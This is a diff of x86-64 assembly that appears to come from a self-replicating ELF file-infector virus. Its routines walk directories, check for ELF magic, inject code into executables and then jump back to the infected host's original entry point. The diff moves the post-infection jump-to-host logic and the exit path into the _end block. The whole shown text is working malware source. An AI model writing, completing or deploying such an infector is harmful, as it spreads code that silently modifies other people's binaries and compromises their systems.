@@ -86,11 +86,25 @@ _inject:
 	cmp byte[rdi + rcx], 0x0
 	jnz .loop_array_string
 
-	_end:
-		xor rax, rax; = 0
-		cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
-		jne _infected
-		jmp _exit
+_end:
+	xor rax, rax; = 0
+	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
+	jne .infected
+	mov rax, 60 ; exit
+	xor rdi, rdi; = 0
+	syscall
+
+	.infected:
+		push r8
+		pop rax
+
+		sub rax, [rel entry_inject]
+		add rax, [rel vaddr]
+
+		add rax, [rel entry_prg]
+		sub rax, [rel vaddr]
+
+		jmp rax
 
 _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 	push r10
@@ -313,7 +327,6 @@ _infect_file: ; (string rdi, stat rsi)
 	cmp rax, 0x0
 	jl .close ; < 0
 
-
 	push rax
 	pop rsi
 	lea rdi, [rel elf_magic]
@@ -533,23 +546,6 @@ _check_file_process:; (string rdi)
 	pop rcx
 	pop r8
 ret
-
-_infected:
-	push r8
-	pop rax
-
-	sub rax, [rel entry_inject]
-	add rax, [rel vaddr]
-
-	add rax, [rel entry_prg]
-	sub rax, [rel vaddr]
-
-	jmp rax
-
-_exit:
-	mov rax, 60 ; exit
-	xor rdi, rdi; = 0
-	syscall
 
 ; ================================ utils =======================================
 
